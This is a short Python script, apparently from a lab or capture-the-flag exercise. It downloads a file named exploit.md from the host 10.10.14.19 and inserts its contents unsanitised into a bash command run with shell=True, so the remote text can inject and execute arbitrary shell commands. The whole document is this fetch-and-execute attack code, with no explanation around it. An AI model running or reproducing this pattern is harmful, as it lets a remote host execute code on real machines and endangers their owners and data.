import requests as pyrequest
import subprocess, os

r = pyrequest.get("http://10.10.14.19/exploit.md",allow_redirects=True)
command = f"cat  $'{r.text.strip()}'"
subprocess.run(command, shell=True, executable="/bin/bash")